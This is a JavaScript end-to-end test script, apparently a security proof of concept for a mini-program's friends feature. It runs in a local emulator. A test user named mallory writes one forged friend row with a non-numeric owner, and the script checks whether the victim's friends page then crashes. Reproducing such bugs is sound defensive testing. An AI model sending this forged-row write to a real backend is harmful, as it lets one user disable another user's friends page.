/* One forged friend row with a non-numeric owner/friend crashes the victim's whole friends page.
 * listFriends() maps cids through Number() -> NaN -> theirBy[NaN] undefined -> throws -> page errors out. */
import * as H from '/home/user/wordminiprogram/cloudbase_e2e_harness.mjs';
const j = (x) => JSON.stringify(x);
const READY = () => !!(window.HansenAuth && window.HansenFriends && window.HansenSbProfile);
const srv = await H.startStatic();
const browser = await H.launchBrowser();
try {
  const emu = H.makeEmulator({ knobs: { permissionMode: 'legacy', latencyMs: 15, jitterMs: 10 } });
  ['alice', 'mallory'].forEach((u) => emu.seedUser({ username: u, password: 'pw123456' }));
  const A = await H.openPhone(browser, emu, srv.origin, { name: 'A', ready: READY });
  await A.eval(() => window.HansenSbProfile.setName('小爱'));
  await H.loginPassword(A, 'alice', 'pw123456');
  const aCid = await A.eval(() => (window.HansenSbProfile.readProfile() || {}).cid || 0);
  const before = await A.eval(async () => { const r = await window.HansenFriends.listFriends(); return { ok: r.ok, friends: (r.friends || []).length, incoming: (r.incoming || []).length }; });
  console.log('[A] listFriends before attack:', j(before));
  const C = await H.openPhone(browser, emu, srv.origin, { name: 'C', ready: READY });
  await H.loginPassword(C, 'mallory', 'pw123456');
  await C.eval(async (aCid) => {
    const db = (await window.HansenAuth._app()).database();
    await db.collection('hansen_friends').add({ kind: 'friend', owner: 'x', friend: aCid, name: '坏', at: Date.now() });
  }, aCid);
  const after = await A.eval(async () => { const r = await window.HansenFriends.listFriends(); return { ok: r.ok, kind: r.kind, reason: String(r.reason || '').slice(0, 80), friends: (r.friends || []).length, incoming: (r.incoming || []).length }; });
  console.log('[A] listFriends AFTER one forged row {owner:"x"}:', j(after));
  console.log(after.ok ? 'RESULT: survived' : 'RESULT: victim friends page is broken by a single forged row (DoS)');
  await A.close(); await C.close();
} finally { await browser.close().catch(() => {}); srv.close(); }
